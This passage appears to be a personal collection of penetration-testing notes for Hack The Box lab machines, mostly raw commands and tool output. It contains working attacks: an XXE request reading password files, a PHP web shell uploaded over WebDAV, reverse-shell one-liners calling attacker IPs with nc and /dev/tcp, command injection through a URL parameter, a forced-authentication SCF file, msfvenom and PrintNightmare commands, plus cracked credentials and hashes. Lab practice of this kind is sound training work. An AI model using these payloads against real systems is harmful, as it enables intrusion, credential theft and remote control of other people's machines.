/>&lt;soapenv:Body&gt;<br />&lt;urn:checkout soapenv:encodingStyle=\&quot;<a href="http://schemas.xmlsoap.org/soap/encoding/\">">http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;</a><br />&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;<br />&lt;/urn:checkout&gt;<br />&lt;/soapenv:Body&gt;<br />&lt;/soapenv:Envelope&gt;&#39; \<br />&#39;<a href="http://muddy.ugc:8888/muddy/soap11'">http://muddy.ugc:8888/muddy/soap11&#39;</a> | xmllint --format -<br /><br /><br /><span style="color:#ffff00;">passwd.dav için yukarıdaki path&#39;i 2.5 saatte buldum! default&#39;lara pek benzemiyor!</span><br /><a href="https://www.howtoforge.com/setting-up-webdav-with-apache2-on-debian-etch">https://www.howtoforge.com/setting-up-webdav-with-apache2-on-debian-etch</a><br /><br />administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0<br />administrant:sleepless<br /><br /><a href="https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60">https://shahjerry33.medium.com/rce-via-webdav-power-of-put-7e1c06c71e60</a><br /><br /><br />PUT /webdav/whiskey.php HTTP/1.1<br />Host: muddy.ugc<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Authorization: Basic YWRtaW5pc3RyYW50OnNsZWVwbGVzcw==<br />Connection: close<br />Cookie: wordpress_test_cookie=WP%20Cookie%20check<br />Upgrade-Insecure-Requests: 1<br />Cache-Control: max-age=0<br />Content-Length: 31<br /><br />&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;<br /><br /><br />after shell:<br />get reverse shell<br /><br /><a href="http://muddy.ugc/webdav/whiskey.php?cmd=rm">http://muddy.ugc/webdav/whiskey.php?cmd=rm</a> %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fsh -i 2&gt;%261|nc 192.168.49.250 6666 &gt;%2Ftmp%2Ff<br /><br />cat /etc/crontab<br /><br />/dev/shm writable!<br /><br /></div><div class='page'><h1 class='title level-1'>HTB Boxes</h1><br/></div><div class='page'><h1 class='title level-2'>bastion.htb</h1><br/><a href="https://0xrick.github.io/hack-the-box/bastion/">https://0xrick.github.io/hack-the-box/bastion/</a><br /><code>l4mpje : bureaulampje</code><br /><code>powershell Invoke-WebRequest -Uri http://10.10.16.10/winPEAS.bat -Outfile</code> win.bat</div><div class='page'><h1 class='title level-2'>knife.htb</h1><br/>─# nmap -A -p- 10.10.10.242  <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-05-30 00:48 +03<br />Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 75.43% done; ETC: 00:50 (0:00:19 remaining)<br />Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br />SYN Stealth Scan Timing: About 99.39% done; ETC: 00:49 (0:00:00 remaining)<br />Nmap scan report for 10.10.10.242<br />Host is up (0.072s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)<br />|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)<br />|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)<br />80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br />|_http-server-header: Apache/2.4.41 (Ubuntu)<br />|_http-title:  Emergent Medical Idea<br />No exact OS matches for host (If you know what OS is running on it, see <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> ).<br />TCP/IP fingerprint:<br />OS:SCAN(V=7.91%E=4%D=5/30%OT=22%CT=1%CU=34656%PV=Y%DS=2%DC=T%G=Y%TM=60B2B71<br />OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M<br />OS:54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%<br />OS:O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%<br />OS:DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=<br />OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF<br />OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=<br />OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%<br />OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)<br /><br />Network Distance: 2 hops<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE (using port 1025/tcp)<br />HOP RTT      ADDRESS<br />1   66.70 ms 10.10.16.1<br />2   66.83 ms 10.10.10.242<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 89.25 seconds<br /><br /><br />curl -I <a href="http://10.10.10.242">http://10.10.10.242</a><br /><br />└─# curl -I <a href="http://10.10.10.242">http://10.10.10.242</a>    <br />HTTP/1.1 200 OK<br />Date: Sat, 29 May 2021 22:52:57 GMT<br />Server: Apache/2.4.41 (Ubuntu)<br /><strong>x-pOWERED-bY: php/8.1.0-DEV</strong><br />Content-Type: text/html; charset=UTF-8<br /><br /><br />exploit php 8.1.0-dev<br />RCE<br /><br />sudo /usr/bin/knife exec /home/james/(ruby script runs bash)<br /><br />test.rb<br />system(&#39;bash&#39;)<br /></div><div class='page'><h1 class='title level-2'>backdoor.htb</h1><br/>PORT     STATE SERVICE REASON         VERSION                                                                                                                <br />22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                           <br />| ssh-hostkey:                                                                                                                                               <br />|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)                                                                                               <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGi<br />rTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaL<br />Em5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4<br />bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=                                                                          <br />|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)                                                                                              <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8S<br />UJAk=                                                                                                                                                        <br />|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)                                                                                            <br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca                                                                           <br />80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))                                                                                         <br />|_http-generator: WordPress 5.8.1                                                                                                                            <br />| http-methods:                                                                                                                                              <br />|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 <br />|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                 <br />|_http-title: Backdoor &amp;#8211; Real-Life                                                                                                                     <br />1337/tcp open  waste?  syn-ack ttl 63                                                                                                                        <br />Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        <br />OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                            <br />Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A <br />or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)                                            <br />No exact OS matches for host (test conditions non-ideal).  <br /><br />Manually check WP<br /><br /><a href="http://backdoor.htb/wp-content/plugins/ebook-download/">http://backdoor.htb/wp-content/plugins/ebook-download/</a><br /><br />ebook readme.txt ⇒ version 1.1<br /><br /><a href="https://www.exploit-db.com/exploits/39575">https://www.exploit-db.com/exploits/39575</a><br /><br /><code>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code><br /><br /><code>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=</code>/proc/sched_debug<br /><br />/proc/{PID}/cmdline<br /><br /><code>/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=</code>/proc/2342/cmdline<br /><br />gdbserver<br /><a href="https://www.exploit-db.com/exploits/50539">https://www.exploit-db.com/exploits/50539</a><br /><br /><br />pkexec has SUID bit<br /><a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a></div><div class='page'><h1 class='title level-2'>pit.htb</h1><br/><br /><br /><br /><br /><br />apt-get install snmp-mibs-downloader<br />download-mibs<br /><br /><br />snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull<br /><br />snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public pit.htb \<br />&#39;nsExtendStatus.&quot;evilcommand&quot;&#39; = createAndGo \<br />&#39;nsExtendCommand.&quot;evilcommand&quot;&#39; = /bin/echo \<br />&#39;nsExtendArgs.&quot;evilcommand&quot;&#39; = &#39;hello world&#39;<br /></div><div class='page'><h1 class='title level-2'>paper.htb</h1><br/><br />HTTP header x-backend : office.paper<br /><br /><a href="http://office.paper/?static=1">http://office.paper/?static=1</a><br /><br />recyclops run bash -i &gt;&amp; /dev/tcp/10.10.16.45/4444 0&gt;&amp;1<br /><br /><br />recyclops<br />Queenofblad3s!23<br /><br />dwight:Queenofblad3s!23 ==&gt;ssh pass<br /><br /><a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Bolt.htb</h1><br/><strong><span style="color:#ffff00;">Docker Load Image</span></strong><br /><br />docker load &lt; image.tar<br /><br /><strong><span style="color:#ffff00;">Docker Explore Image Content</span></strong><br />docker run -it flask-dashboard-adminlte_appseed-app  sh<br /><br /><br />┌──(root💀kali)-[/home/kali/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]<br />└─# john --wordlist=/usr/share/wordlists/rockyou.txt creds.txt <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;<br />Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])<br />Will run 4 OpenMP threads<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />deadbolt         (admin)<br /><br />Extract all tar files in their dir:<br /><br />find /image -type f -name *.tar -execdir tar -xf {} \;<br /><br />grep -iRl &quot;*invite*&quot;</div><div class='page'><h1 class='title level-2'>driver.htb</h1><br/><br /><br />└─# nmap -sV -sC  10.129.214.202 -p-   <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-10-04 23:04 +03                                                                <br />Nmap scan report for driver.htb (10.129.214.202)<br />Host is up (0.13s latency).                                    <br />Not shown: 65531 filtered ports<br />PORT     STATE SERVICE      VERSION<br />80/tcp   open  http         Microsoft IIS httpd 10.0<br />| http-auth:                                                   <br />| HTTP/1.1 401 Unauthorized\x0D<br />|_  Basic realm=MFP Firmware Update Center. Please enter password for admin                                                    <br />| http-methods:                                                <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).                                                            <br />135/tcp  open  msrpc        Microsoft Windows RPC<br />445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                                       <br />5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                            <br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found                                        <br />Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows                                                         <br /><br />Host script results:                                           <br />|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s<br />| smb-security-mode:                                           <br />|   authentication_level: user                                 <br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode:                                          <br />|   2.02:                                                      <br />|_    Message signing enabled but not required<br />| smb2-time:                                                   <br />|   date: 2021-10-05T03:07:42                                  <br />|_  start_date: 2021-10-05T01:01:21<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .                                 <br />Nmap done: 1 IP address (1 host up) scanned in 248.67 seconds<br /><br /><br /><br />make a test.scf file with:<br /><br />[Shell]<br />Command=2<br />IconFile=\\10.10.14.130\nc.ico<br />[Taskbar]<br />Command=ToggleDesktop<br /><br />start responder ⇒ responder -I tun0<br />upload the file from upload section<br /><a href="http://10.129.214.202/fw_up.php">http://10.129.214.202/fw_up.php</a><br /><br /><br />[+] Listening for events...<br />[SMB] NTLMv2-SSP Client   : 10.129.214.202<br />[SMB] NTLMv2-SSP Username : DRIVER\tony<br />[SMB] NTLMv2-SSP Hash     : tony::DRIVER:4546054e764786d6:4D5B56FEA220823897D0512F076F89E0:0101000000000000C0653150DE09D20173249D480BC8C1C9000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000020000062F3A12B6A4F7FD4397891AF71BE9A7A431688EF40189408246EF3D436D350CD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003000000000000000000000000000<br /><br />hashcat -m5600 tony.txt /usr/share/wordlists/rockyou.txt --force<br /><br />tony:liltony<br /><br /><br />more about forced authentication:<br /><a href="https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security/initial-access/t1187-forced-authentication.md">https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security/initial-access/t1187-forced-authentication.md</a><br /><br /><br /><a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html</a><br /><a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html</a><br /><br /><code>oxdf@parrot$ sudo chown -R nobody:root smb/<br />oxdf@parrot$ sudo chmod -R 777 smb/<br />oxdf@parrot$ ls -l smb/</code><br /><br /><code>[global]<br />    map to guest = Bad User<br />    server role = standalone server<br />    usershare allow guests = yes<br />    idmap config * : backend = tdb<br />    smb ports = 445<br /><br />[smb]<br />    comment = Samba<br />    path = /srv/smb/<br />    guest ok = yes<br />    read only = no<br />    browsable = yes<br />    force user = nobody</code><br /><br />msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=10.10.14.135 LPORT=443 -o reverse.dll<br /><br /><br />python3 CVE-2021-1675.py &#39;driver/tony:liltony@10.129.216.78&#39; &#39;\\10.10.14.135\smb\reverse.dll&#39; <br /><br /><code>msfconsole<br />use multi/handler<br />set PAYLOAD windows/x64/shell_reverse_tcp<br />set LHOST 10.10.14.135<br />set LPORT 443<br />run</code><br /></div><div class='page'><h1 class='title level-2'>secret.htb</h1><br/>download files.zip<br /><br />find secret token from git history<br /><br />curl -H &quot;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s&quot; <a href="http://10.129.225.147:3000/api/logs?file=test%3Bwhoami">http://10.129.225.147:3000/api/logs?file=test%3Bwhoami</a><br /><br />curl -H &quot;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s&quot; <a href="http://10.129.225.147:3000/api/logs?file=test%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.252%206666%20%3E%2Ftmp%2Ff">http://10.129.225.147:3000/api/logs?file=test%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.252%206666%20%3E%2Ftmp%2Ff</a><br /><br /><br />TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE<br /><br />@reboot sleep 30;sh -c &#39;cd /home/dasith/local-web ; /usr/local/bin/pm2 start /home/dasith/local-web/index.js&#39;<br /><br /><br />curl -H &quot;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4ifQ.GDRG1ileUj55S0ZdAAZhtUz28Hz4s7fHgqbiES5Qr7s&quot; <a href="http://10.129.226.143:3000/api/logs?file=test%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.252%206666%20%3E%2Ftmp%2Ff">http://10.129.226.143:3000/api/logs?file=test%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.252%206666%20%3E%2Ftmp%2Ff</a><br /><br />python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;<br /><br /><br />linpeas.sh<br /><br />/opt/count<br /><br />kill -BUS PID<br /><br />go to /var/crash find your crash file<br /><br />apport-unpack systemGeneratedCrashReportPath.crash yourNewUnpackDirectoryHere<br /><br /><br />cat CoreDump in the unpacked dir<br /><br />read the file&#39;s content</div><div class='page'><h1 class='title level-2'>explore.htb</h1><br/>└─# nmap -sV -sC  10.10.10.247 -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-10-08 21:43 +03<br />Nmap scan report for explorer.htb (10.10.10.247)<br />Host is up (0.078s latency).<br />Not shown: 65530 closed ports<br />PORT      STATE    SERVICE    VERSION<br />2222/tcp  open     ssh        (protocol 2.0)<br />| fingerprint-strings: <br />|   NULL: <br />|_    SSH-2.0-SSH Server - Banana Studio<br />| ssh-hostkey: <br />|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)<br />5555/tcp  filtered freeciv<br />35531/tcp open     tcpwrapped<br />42135/tcp open     http       ES File Explorer Name Response httpd<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />59777/tcp open     http       Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older<br />|_http-title: Site doesn&#39;t have a title (text/plain).<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port2222-TCP:V=7.91%I=7%D=10/8%Time=61609209%P=x86_64-pc-linux-gnu%r(NU<br />SF:LL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);<br />Service Info: Device: phone<br /><br /><br />ES File Explorer Name Response httpd arbitrary file read<br /><a href="https://www.exploit-db.com/exploits/50070">https://www.exploit-db.com/exploits/50070</a><br /><br /><br /><br /><br />kristi:Kr1sT!5h@Rp3xPl0r3!<br /><br />ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555<br /><br />adb shell</div><div class='page'><h1 class='title level-2'>JET.HTB</h1><br/>─# nmap -sV -sC  10.13.37.10 -p-                                                                                                                                                                                                                             <br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-10-09 11:54 +03                                                                                                                                                                                               <br />Stats: 0:08:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                                                                                                                                               <br />SYN Stealth Scan Timing: About 50.84% done; ETC: 12:11 (0:08:10 remaining)                                                                                                                                                                                    <br />Nmap scan report for 10.13.37.10                                                                                                                                                                                                                              <br />Host is up (0.39s latency).                                                                                                                                                                                                                                   <br />Not shown: 65529 closed ports                                                                                                                                                                                                                                 <br />PORT     STATE SERVICE  VERSION                                                                                                                                                                                                                               <br />22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                          <br />| ssh-hostkey:                                                                                                                                                                                                                                                <br />|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)                                                                                                                                                                                                <br />|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)                                                                                                                                                                                               <br />|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)                                                                                                                                                                                             <br />53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)                                                                                                                                                                                                     <br />| dns-nsid:                                                                                                                                                                                                                                                   <br />|_  bind.version: 9.10.3-P4-Ubuntu                                                                                                                                                                                                                            <br />80/tcp   open  http     nginx 1.10.3 (Ubuntu)                                                                                                                                                                                                                 <br />|_http-server-header: nginx/1.10.3 (Ubuntu)                                                                                                                                                                                                                   <br />|_http-title: Welcome to nginx on Debian!                                                                                                                                                                                                                     <br />5555/tcp open  freeciv?                                                                                                                                                                                                                                       <br />| fingerprint-strings:                                                                                                                                                                                                                                        <br />|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect:                                                                                                                                                                                               <br />|     enter your name:                                                                                                                                                                                                                                        <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                                                                                                                                                                                                                                    <br />|   NULL:                                                                                                                                                                                                                                                     <br />|     enter your name:                                                                                                                                                                                                                                        <br />|   SMBProgNeg:                                                                                                                                                                                                                                               <br />|     enter your name:                                                                                                                                                                                                                                        <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                                                                                                                                                                                                                                    <br />|     invalid option!                                                                                                                                                                                                                                         <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                                                                                                                                                                                                                                    <br />|     invalid option!                                                                                                                                                                                                                                         <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                                                                                                                                                                                                                                    <br />|     invalid option!                                                                                                                                                                                                                                         <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                                                                                                                                                                                                                                    <br />|     invalid option!                                                                                                                                                                                                                                         <br />|     [31mMember manager!                                                                                                                                                                                                                                     <br />|     edit                                                                                                                                                                                                                                                    <br />|     change name                                                                                                                                                                                                                                             <br />|     gift                                                                                                                                                                                                                                                    <br />|     exit                                 <br />|     invalid option!                                          <br />|     [31mMember manager!                                      <br />|     edit                                                     <br />|     change name                                              <br />|     gift                                                     <br />|     exit                                                     <br />|     invalid option!                                          <br />|     [31mMember manager!                                      <br />|     edit                                                     <br />|     change name                                              <br />|     gift                                                     <br />|     exit                                                     <br />|     invalid option!                                          <br />|     [31mMember manager!                                      <br />|     edit                                                     <br />|     change name                                              <br />|     gift                                                     <br />|     exit                                                     <br />|     invalid option!                                          <br />|     [31mMember manager!                                      <br />|     edit                                                     <br />|     change name                                              <br />|     gift                                                     <br />|     exit                                                     <br />|_    invalid option!                                          <br />7777/tcp open  cbt?                                            <br />| fingerprint-strings:                                         <br />|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe: <br />|     --==[[ Spiritual Memo ]]==--<br />|     Create a memo                                            <br />|     Show memo                                                <br />|     Delete memo                                              <br />|     Can&#39;t you read mate?                                     <br />|   NULL:                                                      <br />|     --==[[ Spiritual Memo ]]==--<br />|     Create a memo                                            <br />|     Show memo                                                <br />|_    Delete memo                                              <br />9201/tcp open  http     BaseHTTPServer 0.3 (Python 2.7.12)<br />|_http-title: Site doesn&#39;t have a title (application/json).<br />2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============   <br /><br /><br />─# dig @10.13.37.10 -x 10.13.37.10<br /><br />; &lt;&lt;&gt;&gt; DiG 9.16.11-Debian &lt;&lt;&gt;&gt; @10.13.37.10 -x 10.13.37.10<br />; (1 server found)                                             <br />;; global options: +cmd                                        <br />;; Got answer:                                                 <br />;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 19375<br />;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1<br />;; WARNING: recursion requested but not available<br /><br />;; OPT PSEUDOSECTION:                                          <br />; EDNS: version: 0, flags:; udp: 4096<br />;; QUESTION SECTION:                                           <br />;10.37.13.10.in-addr.arpa.      IN      PTR<br /><br />;; AUTHORITY SECTION:                                          <br />37.13.10.in-addr.arpa.  604800  IN      SOA     <a href="http://www.securewebinc.jet.">www.securewebinc.jet.</a> securewebinc.jet. 3 604800 86400 2419200 604800<br /><br />;; Query time: 375 msec                                        <br />;; SERVER: 10.13.37.10#53(10.13.37.10)<br />;; WHEN: Sat Oct 09 12:20:35 +03 2021<br />;; MSG SIZE  rcvd: 109         <br /><br />add to hosts<br /><br />go to <a href="http://www.securewebinc.jet.">www.securewebinc.jet.</a><br /><br />from the source:<br />secure.js<br /><br />dologin.php<br />sqlmap -r jet.txt --dbms=mysql --dump<br /><br /> 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin <br /><br />john --format=RAW-SHA256 creds.txt --wordlist=/usr/share/wordlists/rockyou.txt<br /><br />Hackthesystem200 (admin) <br /><br />email.php RCE<br /><a href="https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4">https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4</a><br /><br />preg_replace() RCE:<br /><br />change i to e then url encode rm rf reverse shell<br /><br 